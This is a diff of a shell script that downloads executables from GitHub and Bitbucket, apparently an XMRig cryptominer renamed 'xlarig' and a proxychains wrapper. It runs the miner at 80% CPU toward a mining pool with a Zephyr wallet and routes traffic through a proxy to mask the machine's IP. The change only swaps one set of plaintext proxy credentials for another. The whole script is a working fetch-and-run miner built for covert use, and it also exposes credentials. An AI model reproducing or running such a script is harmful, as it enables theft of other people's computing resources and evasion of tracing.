@@ -1,7 +1,7 @@
-proxy="34.238.108.61" 
-port="9293" 
-user="e40dupo6wpng2p"  
-pass="2a6dj7f91191v2hkpoi6xszv7kn" 
+proxy="34.192.31.89" 
+port="1080" 
+user="fixie"  
+pass="Ok6GdpMzuCBCNja" 
 wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x http://e40dupo6wpng2p:2a6dj7f91191v2hkpoi6xszv7kn@34.238.108.61:9293 --cpu-max-threads-hint=80% -k 
+./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:Ok6GdpMzuCBCNja@34.192.31.89:1080 --cpu-max-threads-hint=80% -k 
